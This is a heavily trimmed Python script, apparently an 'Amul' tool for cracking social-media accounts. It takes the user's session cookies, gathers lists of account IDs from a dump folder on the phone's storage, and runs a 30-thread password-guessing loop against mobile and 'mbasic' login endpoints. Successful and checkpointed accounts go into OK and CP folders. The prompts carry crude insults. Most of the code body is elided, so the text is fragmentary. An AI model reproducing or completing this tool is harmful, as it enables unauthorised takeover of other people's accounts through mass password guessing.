...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mⒶⓂⓊⓁ ⓈⒽⒶⓇⓜⓐ_xy')
...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{h}•{x}] Please input your Cookies  :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL........Run the Command Again! and thank you for using mine script !!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
#-----------------[ AMUL-CRACK ]-----------------#
def result():
	print(f'>> 1. AMUL {h}OK{x} Anda ')
	print(f'>> 2. AMUL {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n>> Choose  : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki AMUL CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			...
			try:geh = lol[geeh]
				...
				print('>> Choose  Yang Bener Kontol ')
				back()
...
def dump_massal():
	...
	try:
		print('')
		print(f'>> Total no of Idz🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/AMUL-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/AMUL-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> Choose  Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/AMUL-DUMP/'+geh,'r').read().splitlines()
		except:
...
def setting():
	...
	if hu in ['1','01']:
		...
		print('>> Choose  Yang Bener Kontooll ')
		exit()
	print('>> 1. Mobile ')
	print('>> 2. Mbasic ')
#	print('>> 3. Touch  ')
...
#		method.append('touch')
		...
		method.append('mobile')
	print('')
	_jembot_ = input('>> Do you want to show application on it  ( Y/t ) ')
	if _jembot_ in ['']:
		print('>> Choose   ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('>> Do you want to add Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Loading please wait.....{m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> AMUL {h}OK{x} Amul-Cp : {h}OK/%s {x}'%(okc))
	print(f'>> AMUL {k}CP{x} Amul-Cp : {k}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] Crack Done Broh, Do not Forget to Be Thankful[cyan] ✓[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} Good Bye Take care and lots of love {x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{x}——> {h}Welcome to Amul tool\n\t{x}——> {h}if there is any Bug/Error than contact me \n\t{x}——> {h}Whatever you are be a good one\n\t{x}——> {h}Laude 80hajar ka script hay\n\t{x}——> {h}Have a Nice Day Dear{x}')
	time.sleep(3)
	login()
